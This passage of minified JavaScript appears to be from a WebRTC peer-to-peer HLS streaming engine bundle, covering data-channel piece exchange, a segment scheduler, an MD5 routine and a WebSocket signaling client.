                                                        (0, l.value.handler)(t.bufSN, t.segId, !0, "aborted by upstream peer") } } catch (e) { s = !0, o = e } finally { try {!a && u.return && u.return() } finally { if (s) throw o } }
                                                t.downloadListeners = [] }
                                            t.emit(p.default.DC_PIECE_ABORT, i) } break;
                                    case p.default.DC_CHOKE:
                                        r.info("choke peer " + t.remotePeerId), t.choked = !0; break;
                                    case p.default.DC_UNCHOKE:
                                        r.info("unchoke peer " + t.remotePeerId), t.choked = !1; break;
                                    default:
                                        t.emit(i.event, i) } } else { if (!t.downloading) return void r.error("peer is not downloading, data size " + e.byteLength + " pieceMsg " + JSON.stringify(t.pieceMsg));
                                t._handleBinaryMsg(e) } }), e.once("close", function() { t.emit(p.default.DC_CLOSE) }), e.on("iceStateChange", function(e, r) { "disconnected" === e && (t.logger.warn(t.remotePeerId + " disconnected"), t.connected = !1) }) } }, { key: "sendJson", value: function(e) { return e.event !== p.default.DC_PLAYLIST && e.event !== p.default.DC_PEER_SIGNAL && this.logger.debug("dc bufferSize " + this._datachannel.bufferSize + " send " + JSON.stringify(e) + " to " + this.remotePeerId), this.send(JSON.stringify(e)) } }, { key: "send", value: function(e) { if (this._datachannel && this._datachannel.connected) try { return this._datachannel.send(e), !0 } catch (e) { this.logger.warn("datachannel " + this.channelId + " send data failed, close it"), this.emit(p.default.DC_ERROR, !1) }
                        return !1 } }, { key: "sendMsgHave", value: function(e, t) { this.sendJson({ event: p.default.DC_HAVE, sn: e, seg_id: t }) } }, { key: "sendPieceNotFound", value: function(e, t) { this.uploading = !1, this.sendJson({ event: p.default.DC_PIECE_NOT_FOUND, seg_id: t, sn: e }) } }, { key: "sendPeers", value: function(e) { this.sendJson({ event: p.default.DC_PEERS, peers: e }) } }, { key: "sendPeersRequest", value: function() { this.sendJson({ event: p.default.DC_GET_PEERS }) } }, { key: "sendSubscribe", value: function() { this.sendJson({ event: p.default.DC_SUBSCRIBE }) } }, { key: "sendUnsubscribe", value: function(e) { this.resetContinuousHits(), this.sendJson({ event: p.default.DC_UNSUBSCRIBE, reason: e }) } }, { key: "sendSubscribeReject", value: function(e) { this.sendJson({ event: p.default.DC_SUBSCRIBE_REJECT, reason: e }) } }, { key: "sendSubscribeAccept", value: function(e) { this.sendJson({ event: p.default.DC_SUBSCRIBE_ACCEPT, level: e }) } }, { key: "sendSubscribeLevel", value: function(e) { this.sendJson({ event: p.default.DC_SUBSCRIBE_LEVEL, level: e }) } }, { key: "sendMsgStats", value: function(e, t) { var r = { event: p.default.DC_STATS, total_conns: e, children: t };
                        this.sendJson(r) } }, { key: "sendMsgPlaylist", value: function(e, t) { var r = { event: p.default.DC_PLAYLIST, url: e, data: t };
                        this.sendJson(r) } }, { key: "sendMsgSignal", value: function(e, t, r) { return this.sendJson({ event: p.default.DC_PEER_SIGNAL, action: "signal", to_peer_id: e, from_peer_id: t, data: r }) } }, { key: "sendMsgSignalReject", value: function(e, t, r) { var i = arguments.length > 3 && void 0 !== arguments[3] && arguments[3]; return this.sendJson({ event: p.default.DC_PEER_SIGNAL, action: "reject", to_peer_id: e, from_peer_id: t, reason: r, fatal: i }) } }, { key: "sendMetaData", value: function(e, t) { var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        this.sendJson({ event: p.default.DC_METADATA, field: e, platform: p.default.DC_PLAT_WEB, mobile: !!_.default.isMobile(), channel: this.channel, version: "1.16.10", sequential: t, peers: r }) } }, { key: "sendPartialBuffer", value: function(e, t) { var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                        this.sendMsgPiece(e, r); for (var i = 0; i < t.length; i++) this.send(t[i]) } }, { key: "sendMsgPiece", value: function(e) { var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                        e.ext || (e.ext = {}), e.ext.from && t.from && (t.from = e.ext.from + "->" + t.from), t.incompletes && e.ext.incompletes && (t.incompletes += e.ext.incompletes), t = Object.assign({}, e.ext, t); var r = l({}, e, { ext: t });
                        this.sendJson(r) } }, { key: "sendBuffer", value: function(e, t, r) { var i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {},
                            n = r.byteLength,
                            a = 0,
                            s = 0;
                        n % this.packetSize == 0 ? s = n / this.packetSize : (s = Math.floor(n / this.packetSize) + 1, a = n % this.packetSize); var l = { event: p.default.DC_PIECE, attachments: s, seg_id: t, sn: e, size: n };
                        this.sendMsgPiece(l, i); for (var u = o(r, this.packetSize, s, a), c = 0; c < u.length; c++) this.send(u[c]);
                        this.uploading = !1, this.timeSendPiece = performance.now() } }, { key: "requestDataById", value: function(e, t) { var r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
                            i = { event: p.default.DC_REQUEST, seg_id: e, sn: t, urgent: r };
                        this.downloading ? (this.logger.info("add req " + e + " in queue"), r ? this.sendReqQueue.unshift(i) : this.sendReqQueue.push(i)) : this._realRequestData(i) } }, { key: "requestDataBySN", value: function(e) { var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                            r = { event: p.default.DC_REQUEST, sn: e, urgent: t };
                        this.downloading ? (this.logger.info("add req " + e + " in queue"), t ? this.sendReqQueue.unshift(r) : this.sendReqQueue.push(r)) : this._realRequestData(r) } }, { key: "_realRequestData", value: function(e) { this.sendJson(e), this.timeSendRequest = performance.now(), this.downloading = !0 } }, { key: "shouldWaitForRemain", value: function(e) { if (0 === this.bufArr.length) return !1; if (0 === this.timeReceivePiece) return !1;
                        this.logger.warn(this.bufArr.length + " of " + this.pieceMsg.attachments + " packets loaded"); for (var t = 0, r = 0; r < this.bufArr.length; r++) t += this.bufArr[r].byteLength; return t / (performance.now() - this.timeReceivePiece) >= (this.expectedSize - t) / e } }, { key: "close", value: function() { this.emit(p.default.DC_CLOSE) } }, { key: "receiveSignal", value: function(e) { this._datachannel.signal(e) } }, { key: "resetContinuousHits", value: function() { var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
                        this.logger.info("reset " + this.remotePeerId + " continuousHits"), this.continuousHits = e } }, { key: "increContinuousHits", value: function() { this.continuousHits++ } }, { key: "destroy", value: function() { if (this.logger.info("destroy datachannel " + this.channelId), this.chokeTimer && clearTimeout(this.chokeTimer), this.connTimeout && clearTimeout(this.connTimeout), this.uploading && this.sendMsgPieceAbort("peer is closing"), this.downloadListeners.length > 0) { var e = !0,
                                t = !1,
                                r = void 0; try { for (var i, n = this.downloadListeners[Symbol.iterator](); !(e = (i = n.next()).done); e = !0) {
                                    (0, i.value.handler)(this.bufSN, this.segId, !0, "upstream peer is closed") } } catch (e) { t = !0, r = e } finally { try {!e && n.return && n.return() } finally { if (t) throw r } }
                            this.downloadListeners = [] } var a = { event: p.default.DC_CLOSE };
                        this.sendJson(a), this._datachannel.removeAllListeners(), this.removeAllListeners(), this._datachannel.destroy() } }, { key: "_handleBinaryMsg", value: function(e) { if (this.bufArr.push(e), this.remainAttachments--, this.downloadListeners.length > 0) { var t = !0,
                                r = !1,
                                i = void 0; try { for (var n, a = this.downloadListeners[Symbol.iterator](); !(t = (n = a.next()).done); t = !0) {
                                    (0, n.value.handler)(this.bufSN, this.segId, !1, e, 0 === this.remainAttachments) } } catch (e) { r = !0, i = e } finally { try {!t && a.return && a.return() } finally { if (r) throw i } } } if (0 === this.remainAttachments) { if (this.downloadListeners = [], this.timeSendRequest > 0) { var s = this.expectedSize / (performance.now() - this.timeSendRequest);
                                this.weight = Math.round(s) }
                            this.sendJson({ event: p.default.DC_PIECE_ACK, sn: this.bufSN, seg_id: this.segId, size: this.expectedSize }), this.timeSendRequest = 0, this.timeReceivePiece = 0, this._sendNextReq() || (this.downloading = !1), this._handleBinaryData() } } }, { key: "_sendNextReq", value: function() { if (this.sendReqQueue.length > 0) { var e = this.sendReqQueue.shift(); return this.logger.info("get msg from sendReqQueue " + JSON.stringify(e)), this._realRequestData(e), !0 } return !1 } }, { key: "_handlePlaylist", value: function(e) { var t = e.url,
                            r = e.data,
                            i = (0, v.getCurrentTs)();
                        this.playlistMap.set(t, { data: r, ts: i }) } }, { key: "getLatestPlaylist", value: function(e, t) { if (!this.playlistMap.has(e)) return null; var r = this.playlistMap.get(e); return r.ts <= t ? null : r } }, { key: "_handleMetadata", value: function(e) { var t = this,
                            r = this.logger,
                            i = e.channel; if (!i) return r.error("peer channel " + i + " is null!"), void this.emit(p.default.DC_ERROR, !0); if (this.channel !== i) return r.error("peer channel " + i + " not matched!"), void this.emit(p.default.DC_ERROR, !0); switch (e.platform) {
                            case p.default.DC_PLAT_ANDROID:
                                this.platform = p.default.DC_PLAT_ANDROID; break;
                            case p.default.DC_PLAT_IOS:
                                this.platform = p.default.DC_PLAT_IOS; break;
                            case p.default.DC_PLAT_WEB:
                                this.platform = p.default.DC_PLAT_WEB } if (this.mobile = e.mobile || !1, this.mobileWeb = this.mobile && this.platform === p.default.DC_PLAT_WEB || !1, this.sequential = e.sequential, this.sequential !== this.typeExpected) return r.error("peer sequential type " + this.sequential + " not matched!"), void this.emit(p.default.DC_ERROR, !0);
                        r.info(this.remotePeerId + " platform " + this.platform + " sequential " + this.sequential), e.peers && (this.peersConnected += e.peers, r.info(this.remotePeerId + " now has " + this.peersConnected + " peers")), this.emit(p.default.DC_METADATA, e), e.field && !this.config.live && e.sequential && e.field.forEach(function(e) { e > 0 && (e < t.startSN && (t.startSN = e), e > t.endSN && (t.endSN = e)) }) } }, { key: "_handleStats", value: function(e) { var t = e.total_conns;
                        t > 0 && this.peersConnected !== t && (this.peersConnected = t, this.logger.info(this.remotePeerId + " now has " + this.peersConnected + " peers")) } }, { key: "_handleRequestMsg", value: function(e) { if (this.uploading) return void this.logger.warn(this.remotePeerId + " is uploading when receive request");
                        this.uploading = !0, this.emit(p.default.DC_REQUEST, e) } }, { key: "_handlePieceAck", value: function(e) { 0 !== this.timeSendPiece && (this.uploadSpeed = Math.round(e.size / (performance.now() - this.timeSendPiece) * 2), this.timeSendPiece = 0, this.logger.info(this.remotePeerId + " uploadSpeed is " + this.uploadSpeed)) } }, { key: "_prepareForBinary", value: function(e, t, r, i) { this.bufArr = [], this.remainAttachments = e, this.segId = t, this.bufSN = r, this.expectedSize = i } }, { key: "_handleBinaryData", value: function() { var e = E.concat(this.bufArr),
                            t = e.byteLength; if (t === this.expectedSize) { var r = new Uint8Array(e).buffer,
                                i = new y.default(this.bufSN, this.segId, r, this.remotePeerId);
                            this.emit(p.default.DC_RESPONSE, i, this.weight) } else this.logger.error(this.segId + " expectedSize " + this.expectedSize + " not equal to byteLength " + t);
                        this.segId = "", this.bufArr = [], this.expectedSize = -1 } }, { key: "checkIfNeedChoke", value: function() { var e = this,
                            t = this.logger; if (this.miss++, t.info(this.channelId + " miss " + this.miss), this.miss > 2 && !this.choked) { this.choked = !0; var r = 30 * this.miss;
                            r <= 150 ? (t.warn("datachannel " + this.channelId + " is choked"), this.chokeTimer = setTimeout(function() { e.choked = !1, t.warn("datachannel " + e.channelId + " is unchoked") }, 1e3 * r)) : t.warn("datachannel " + this.channelId + " is choked permanently") } } }, { key: "loadtimeout", value: function() { this.logger.warn("timeout while downloading from " + this.remotePeerId), this.bufSN && this.pieceMsg.sn === this.bufSN ? this.logger.warn(this.bufArr.length + " of " + this.pieceMsg.attachments + " packets loaded") : this.logger.warn("no piece msg received"), this.emit(p.default.DC_TIMEOUT), this.checkIfNeedChoke() } }, { key: "sendMsgPieceAbort", value: function(e) { this.uploading = !1, this.sendJson({ event: p.default.DC_PIECE_ABORT, reason: e }) } }, { key: "isAvailable", get: function() { return this.downloadNum < 2 && !this.choked } }, { key: "isAvailableUrgently", get: function() { return !this.downloading && !this.choked } }, { key: "downloadNum", get: function() { return this.downloading ? this.sendReqQueue.length + 1 : 0 } }]), t }(h.default);
        t.default = T, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e, t) { var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 75,
                i = null,
                n = !1,
                a = r; return function() { if (arguments.length > 0 && void 0 !== arguments[0] && arguments[0]) return clearTimeout(i), void(n = !1);
                n || (n = !0, i = setTimeout(function() { e.call(t, a), n = !1, i = null }, 1e3 * a), a *= 1) } }
        Object.defineProperty(t, "__esModule", { value: !0 }), t.default = i, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e) { if (Array.isArray(e)) { for (var t = 0, r = Array(e.length); t < e.length; t++) r[t] = e[t]; return r } return Array.from(e) }

        function a(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function s(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function o(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var l = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            u = function e(t, r, i) { null === t && (t = Function.prototype); var n = Object.getOwnPropertyDescriptor(t, r); if (void 0 === n) { var a = Object.getPrototypeOf(t); return null === a ? void 0 : e(a, r, i) } if ("value" in n) return n.value; var s = n.get; if (void 0 !== s) return s.call(i) },
            c = r(2),
            d = r(9),
            f = i(d),
            h = r(20),
            g = i(h),
            p = r(5),
            v = function(e) {
                function t(e, r) { a(this, t); var i = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, r)); return i.logger.info("use IdScheduler"), i.sequential = !1, i } return o(t, e), l(t, [{ key: "load", value: function(e, t, r) { this.isReceiver = !0; var i = this.logger;
                        this.context = e; var a = e.frag,
                            s = a.segId,
                            o = a.sn;
                        this.callbacks = r, this.stats = (0, p.createLoadStats)(), this.criticalSeg = { sn: o, segId: s, targetPeers: [].concat(n(this.targetPeers.map(function(e) { return e.remotePeerId }))) }; var l = this.mBufferedDuration - this.config.httpLoadTime;
                        l > this.dcDownloadTimeout && (l = this.dcDownloadTimeout); var u = !0,
                            c = !1,
                            d = void 0; try { for (var f, h = this.targetPeers[Symbol.iterator](); !(u = (f = h.next()).done); u = !0) { var g = f.value;
                                g.downloading || (i.info("request criticalSeg segId " + s + " at " + o + " from " + g.remotePeerId + " timeout " + l), g.requestDataById(s, o, !0)), this.requestingMap.set(s, g.remotePeerId) } } catch (e) { c = !0, d = e } finally { try {!u && h.return && h.return() } finally { if (c) throw d } }
                        this.criticaltimeouter = setTimeout(this.criticaltimeout.bind(this, !0), 1e3 * l), this.targetPeers = [] } }, { key: "onBufferManagerLost", value: function(e, t, r) { this.bitset.delete(t), this.bitCounts.delete(t) } }, { key: "destroy", value: function() { u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "destroy", this).call(this), this.logger.warn("destroy IdScheduler") } }, { key: "_setupDC", value: function(e) { var r = this;
                        u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "_setupDC", this).call(this, e); var i = this.logger,
                            a = this.config;
                        e.on(f.default.DC_HAVE, function(t) { if (t.seg_id && e.bitset) { var i = t.seg_id; for (e.bitset.add(i), r.bitset.has(i) || r._increBitCounts(i); a.live && e.bitset.size > 20;) { var s = [].concat(n(e.bitset.values())).shift();
                                    e.bitset.delete(s) }
                                r.emit(f.default.SCH_DCHAVE, t.seg_id) } }).on(f.default.DC_LOST, function(t) { if (t.seg_id && e.bitset) { var i = t.seg_id;
                                e.bitset.delete(i), r._decreBitCounts(i) } }).on(f.default.DC_PIECE, function(e) { e.ext && e.ext.incompletes >= 3 || r.notifyAllPeers(e.sn, e.seg_id) }).on(f.default.DC_PIECE_NOT_FOUND, function(t) { var n = t.seg_id;
                            r.criticalSeg && r.criticalSeg.segId === n && (1 === r.criticalSeg.targetPeers.length ? (clearTimeout(r.criticaltimeouter), i.info("DC_PIECE_NOT_FOUND"), r.criticalSeg = null, r.callbacks.onTimeout(r.stats, r.context, null)) : r.criticalSeg.targetPeers = r.criticalSeg.targetPeers.filter(function(t) { return t !== e.remotePeerId })), e.bitset.delete(n), r.requestingMap.delete(n), r._decreBitCounts(n), e.checkIfNeedChoke() }).on(f.default.DC_RESPONSE, function(n, a) { var s = n.segId,
                                o = n.sn,
                                l = n.data,
                                d = r.criticalSeg && r.criticalSeg.segId === s; if (r.config.validateSegment(s, l))
                                if (r.notifyAllPeers(o, s), u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "reportDCTraffic", r).call(r, s, n.size, a), d) { i.info("receive criticalSeg seg_id " + s), clearTimeout(r.criticaltimeouter), r.criticaltimeouter = null, e.miss = 0; var f = r.stats;
                                    f.tfirst = f.loading.first = Math.max(f.trequest, performance.now()), f.tload = f.loading.end = f.tfirst, f.loaded = f.total = l.byteLength, r.criticalSeg = null; var h = r.context.frag;
                                    h.fromPeerId = e.remotePeerId, h.loadByP2P = !0, r.callbacks.onSuccess({ data: l }, f, r.context) } else { if (r.bitset.has(s)) return; var g = new c.Segment(o, s, l, e.remotePeerId);
                                    r.bufMgr.putSeg(g), r.updateLoaded(s) }
                            else i.warn("segment " + s + " validate failed"), d && (clearTimeout(r.criticaltimeouter), r.criticaltimeout());
                            r.requestingMap.delete(s) }).on(f.default.DC_REQUEST, function(t) { r.isUploader = !0; var n = t.seg_id,
                                a = null; if (r.requestingMap.has(n) && (a = r.getPeerLoadedMore(n)), r.bufMgr.hasSegOfId(n)) { i.info("found seg from bufMgr"); var s = r.bufMgr.getSegById(n);
                                e.sendBuffer(s.sn, s.segId, s.data) } else a && a.downloading && a.pieceMsg.seg_id === n ? (i.info("target had partial buffer, wait for remain"), e.sendPartialBuffer(a.pieceMsg, a.bufArr, { from: "WaitForPartial", incompletes: 1 }), function(t, r) { t.addDownloadListener(function(t, i, n, a, s) { n ? r.sendMsgPieceAbort(a) : r.send(a), s && (e.uploading = !1) }) }(a, e)) : (i.info("peer request " + n + " wait for seg"), r.bufMgr.once("" + f.default.BM_ADDED_SEG_ + n, function(r) { r ? (i.info("peer request notify seg " + n), e.sendBuffer(r.sn, r.segId, r.data)) : e.sendPieceNotFound(t.sn, n) })) }) } }, { key: "_setupEngine", value: function() { var e = this;
                        this.engine.on(f.default.FRAG_LOADING, function(t, r, i) { e.loadingSegId = r, i && e.notifyAllPeers(t, r) }).on(f.default.FRAG_LOADED, function(t, r) { r && e.updateLoaded(r) }) } }]), t }(g.default);
        t.default = v, e.exports = t.default }, function(e, t, r) { "use strict"; var i = void 0;
        e.exports = "function" == typeof queueMicrotask ? queueMicrotask.bind(globalThis) : function(e) { return (i || (i = Promise.resolve())).then(e).catch(function(e) { return setTimeout(function() { throw e }, 0) }) } }, function(e, t, r) { "use strict";

        function i(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }
        Object.defineProperty(t, "__esModule", { value: !0 }); var n = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            a = function() {
                function e(t, r, n, a) { i(this, e), this._sn = t, this._segId = r, this._data = n, this._fromPeerId = a } return n(e, [{ key: "size", get: function() { return this._data.byteLength } }, { key: "sn", get: function() { return this._sn } }, { key: "segId", get: function() { return this._segId } }, { key: "data", get: function() { return this._data } }, { key: "fromPeerId", get: function() { return this._fromPeerId } }, { key: "isSequential", get: function() { return this._sn >= 0 } }]), e }();
        t.default = a, e.exports = t.default }, function(e, t, r) { "use strict"; var i; "function" == typeof Symbol && Symbol.iterator;! function(n) {
            function a(e, t) { var r = (65535 & e) + (65535 & t); return (e >> 16) + (t >> 16) + (r >> 16) << 16 | 65535 & r }

            function s(e, t) { return e << t | e >>> 32 - t }

            function o(e, t, r, i, n, o) { return a(s(a(a(t, e), a(i, o)), n), r) }

            function l(e, t, r, i, n, a, s) { return o(t & r | ~t & i, e, t, n, a, s) }

            function u(e, t, r, i, n, a, s) { return o(t & i | r & ~i, e, t, n, a, s) }

            function c(e, t, r, i, n, a, s) { return o(t ^ r ^ i, e, t, n, a, s) }

            function d(e, t, r, i, n, a, s) { return o(r ^ (t | ~i), e, t, n, a, s) }

            function f(e, t) { e[t >> 5] |= 128 << t % 32, e[14 + (t + 64 >>> 9 << 4)] = t; var r, i, n, s, o, f = 1732584193,
                    h = -271733879,
                    g = -1732584194,
                    p = 271733878; for (r = 0; r < e.length; r += 16) i = f, n = h, s = g, o = p, f = l(f, h, g, p, e[r], 7, -680876936), p = l(p, f, h, g, e[r + 1], 12, -389564586), g = l(g, p, f, h, e[r + 2], 17, 606105819), h = l(h, g, p, f, e[r + 3], 22, -1044525330), f = l(f, h, g, p, e[r + 4], 7, -176418897), p = l(p, f, h, g, e[r + 5], 12, 1200080426), g = l(g, p, f, h, e[r + 6], 17, -1473231341), h = l(h, g, p, f, e[r + 7], 22, -45705983), f = l(f, h, g, p, e[r + 8], 7, 1770035416), p = l(p, f, h, g, e[r + 9], 12, -1958414417), g = l(g, p, f, h, e[r + 10], 17, -42063), h = l(h, g, p, f, e[r + 11], 22, -1990404162), f = l(f, h, g, p, e[r + 12], 7, 1804603682), p = l(p, f, h, g, e[r + 13], 12, -40341101), g = l(g, p, f, h, e[r + 14], 17, -1502002290), h = l(h, g, p, f, e[r + 15], 22, 1236535329), f = u(f, h, g, p, e[r + 1], 5, -165796510), p = u(p, f, h, g, e[r + 6], 9, -1069501632), g = u(g, p, f, h, e[r + 11], 14, 643717713), h = u(h, g, p, f, e[r], 20, -373897302), f = u(f, h, g, p, e[r + 5], 5, -701558691), p = u(p, f, h, g, e[r + 10], 9, 38016083), g = u(g, p, f, h, e[r + 15], 14, -660478335), h = u(h, g, p, f, e[r + 4], 20, -405537848), f = u(f, h, g, p, e[r + 9], 5, 568446438), p = u(p, f, h, g, e[r + 14], 9, -1019803690), g = u(g, p, f, h, e[r + 3], 14, -187363961), h = u(h, g, p, f, e[r + 8], 20, 1163531501), f = u(f, h, g, p, e[r + 13], 5, -1444681467), p = u(p, f, h, g, e[r + 2], 9, -51403784), g = u(g, p, f, h, e[r + 7], 14, 1735328473), h = u(h, g, p, f, e[r + 12], 20, -1926607734), f = c(f, h, g, p, e[r + 5], 4, -378558), p = c(p, f, h, g, e[r + 8], 11, -2022574463), g = c(g, p, f, h, e[r + 11], 16, 1839030562), h = c(h, g, p, f, e[r + 14], 23, -35309556), f = c(f, h, g, p, e[r + 1], 4, -1530992060), p = c(p, f, h, g, e[r + 4], 11, 1272893353), g = c(g, p, f, h, e[r + 7], 16, -155497632), h = c(h, g, p, f, e[r + 10], 23, -1094730640), f = c(f, h, g, p, e[r + 13], 4, 681279174), p = c(p, f, h, g, e[r], 11, -358537222), g = c(g, p, f, h, e[r + 3], 16, -722521979), h = c(h, g, p, f, e[r + 6], 23, 76029189), f = c(f, h, g, p, e[r + 9], 4, -640364487), p = c(p, f, h, g, e[r + 12], 11, -421815835), g = c(g, p, f, h, e[r + 15], 16, 530742520), h = c(h, g, p, f, e[r + 2], 23, -995338651), f = d(f, h, g, p, e[r], 6, -198630844), p = d(p, f, h, g, e[r + 7], 10, 1126891415), g = d(g, p, f, h, e[r + 14], 15, -1416354905), h = d(h, g, p, f, e[r + 5], 21, -57434055), f = d(f, h, g, p, e[r + 12], 6, 1700485571), p = d(p, f, h, g, e[r + 3], 10, -1894986606), g = d(g, p, f, h, e[r + 10], 15, -1051523), h = d(h, g, p, f, e[r + 1], 21, -2054922799), f = d(f, h, g, p, e[r + 8], 6, 1873313359), p = d(p, f, h, g, e[r + 15], 10, -30611744), g = d(g, p, f, h, e[r + 6], 15, -1560198380), h = d(h, g, p, f, e[r + 13], 21, 1309151649), f = d(f, h, g, p, e[r + 4], 6, -145523070), p = d(p, f, h, g, e[r + 11], 10, -1120210379), g = d(g, p, f, h, e[r + 2], 15, 718787259), h = d(h, g, p, f, e[r + 9], 21, -343485551), f = a(f, i), h = a(h, n), g = a(g, s), p = a(p, o); return [f, h, g, p] }

            function h(e) { var t, r = "",
                    i = 32 * e.length; for (t = 0; t < i; t += 8) r += String.fromCharCode(e[t >> 5] >>> t % 32 & 255); return r }

            function g(e) { var t, r = []; for (r[(e.length >> 2) - 1] = void 0, t = 0; t < r.length; t += 1) r[t] = 0; var i = 8 * e.length; for (t = 0; t < i; t += 8) r[t >> 5] |= (255 & e.charCodeAt(t / 8)) << t % 32; return r }

            function p(e) { return h(f(g(e), 8 * e.length)) }

            function v(e, t) { var r, i, n = g(e),
                    a = [],
                    s = []; for (a[15] = s[15] = void 0, n.length > 16 && (n = f(n, 8 * e.length)), r = 0; r < 16; r += 1) a[r] = 909522486 ^ n[r], s[r] = 1549556828 ^ n[r]; return i = f(a.concat(g(t)), 512 + 8 * t.length), h(f(s.concat(i), 640)) }

            function m(e) { var t, r, i = "0123456789abcdef",
                    n = ""; for (r = 0; r < e.length; r += 1) t = e.charCodeAt(r), n += i.charAt(t >>> 4 & 15) + i.charAt(15 & t); return n }

            function y(e) { return unescape(encodeURIComponent(e)) }

            function b(e) { return p(y(e)) }

            function _(e) { return m(b(e)) }

            function E(e, t) { return v(y(e), y(t)) }

            function S(e, t) { return m(E(e, t)) }

            function T(e, t, r) { return t ? r ? E(t, e) : S(t, e) : r ? b(e) : _(e) }
            void 0 !== (i = function() { return T }.call(t, r, t, e)) && (e.exports = i) }() }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function a(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function s(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var o = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            l = r(1),
            u = i(l),
            c = r(29),
            d = i(c),
            f = r(0),
            h = 60,
            g = function(e) {
                function t(e, r, i, s) { var o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : "ws";
                    n(this, t); var l = a(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this)); return l.engine = e, l.logger = e.logger, l.config = i, l.wsAddr = r, l.connected = !1, l.connecting = !1, l.serverVersion = 0, l.pingInterval = s || h, l._ws = l._init(), l.name = o, l } return s(t, e), o(t, [{ key: "_init", value: function() { var e = this,
                            t = { maxRetries: this.config.wsMaxRetries, minReconnectionDelay: 1e3 * (0, f.randomNum)(15, 40), maxReconnectionDelay: 6e5 },
                            r = new d.default(this.wsAddr, void 0, t); return r.onopen = function() { e.logger.info(e.name + " " + e.wsAddr + " connection opened"), e.connected = !0, e.connecting = !1, e.onopen && e.onopen(), e._startPing(e.pingInterval) }, r.push = r.send, r.send = function(e) { var t = JSON.stringify(e);
                            r.push(t) }, r.onmessage = function(t) { var r = t.data,
                                i = JSON.parse(r),
                                n = i.action; return "pong" === n ? void clearTimeout(e.pongTimer) : "ver" === n ? void(e.serverVersion = i.ver) : void(e.onmessage && e.onmessage(i)) }, r.onclose = function(t) { e.logger.warn(e.name + " " + e.wsAddr + " closed " + t.code + " " + t.reason), e.onclose && e.onclose(), e.connected = !1, e.connecting = !1, e._stopPing(), 1e3 === t.code || (e.connecting = !0) }, r.onerror = function(t) { e.logger.error(e.name + " " + e.wsAddr + " error"), e.connecting = !1, e._stopPing(), e.onerror && e.onerror(t) }, r } }, { key: "sendSignal", value: function(e, t) { var r = { action: "signal", to_peer_id: e, data: t };
                        this._send(r) } }, { key: "sendReject", value: function(e, t, r) { var i = { action: "reject", to_peer_id: e, reason: t, fatal: r };
                        this._send(i) } }, { key: "_send", value: function(e) { this.connected && this._ws ? this._ws.send(e) : this.logger.warn(this.name + " closed, send msg " + JSON.stringify(e) + " failed") } }, { key: "_startPing", value: function() { var e = this,
                            t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 120;
                        this.connected && this._ws && (this.pingTimer = setInterval(function() { var t = { action: "ping" };
                            e._send(t), "signaler" === e.name && e.serverVersion >= 22 && e._waitForPong() }, 1e3 * t)) } }, { key: "_waitForPong", value: function() { var e = this;
                        this.pongTimer = setTimeout(function() { e.logger.warn(e.name + " wait for pong timeout, reconnect"), e.close(), e.reconnect() }, 15e3) } }, { key: "_resetPing", value: function() { this._stopPing(), this._startPing(this.pingInterval) } }, { key: "_stopPing", value: function() { clearInterval(this.pingTimer), clearTimeout(this.pongTimer), this.pingTimer = null, this.pongTimer = null } }, { key: "close", value: function() { this.logger.info("close " + this.name), this._stopPing(), this.connected && (this.connected = !1, this._ws && this._ws.close(1e3, "normal close", { keepClosed: !0 })) } }, { key: "reconnect", value: function() { this.connected || this.connecting || !this._ws || (this.connecting = !0, this.logger.info("reconnect " + this.name + " client"), this._ws = this._init()) } }, { key: "destroy", value: function() { this.close(), this._ws = null, this.removeAllListeners() } }]), t }(u.default);
